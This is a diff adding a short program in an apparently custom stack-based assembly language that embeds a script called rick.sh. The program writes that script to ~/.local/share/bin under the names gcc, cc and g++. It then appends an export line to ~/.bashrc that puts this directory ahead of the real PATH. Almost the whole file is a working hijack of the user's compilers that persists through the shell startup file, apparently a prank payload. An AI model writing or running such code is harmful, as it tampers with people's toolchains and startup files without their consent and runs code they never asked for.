@@ -1,0 +1,60 @@
+; === INIT REGS ===
+PUSH "3"
+INIT
+; =================
+
+; === EMBED SCRIPT ===
+#EMBED rick.sh
+POP r0
+; ====================
+
+; === GET PATH ================
+PUSH "echo $HOME/.local/share/bin"
+SYSTEM
+POP r1
+; ==============================
+
+; === CREATE DIRECTORY ============
+PUSHREG r1
+MKDIR 
+; =================================
+
+; === INJECT GCC ==================
+PUSH "/gcc"
+APPEND r1
+OPEN r2 "w"
+PUSHREG r0
+WRITE r2
+; =================================
+
+; === INJECT CC ==================
+PUSH "/cc"
+APPEND r1
+OPEN r2 "w"
+PUSHREG r0
+WRITE r2
+; =================================
+
+; === INJECT G++ ==================
+PUSH "/g++"
+APPEND r1
+OPEN r2 "w"
+PUSHREG r0
+WRITE r2
+; =================================
+
+; === CREATE PATH VARIABLE ========
+PUSH "export PATH="
+POP r2
+PUSHREG r1
+APPEND r2
+POP r2
+PUSH ":$PATH"
+APPEND r2
+; ================================
+
+; === INJECT INTO BASHRC ========
+PUSH "~/.bashrc"
+OPEN r2 "a"
+WRITE r2 
+;===============================
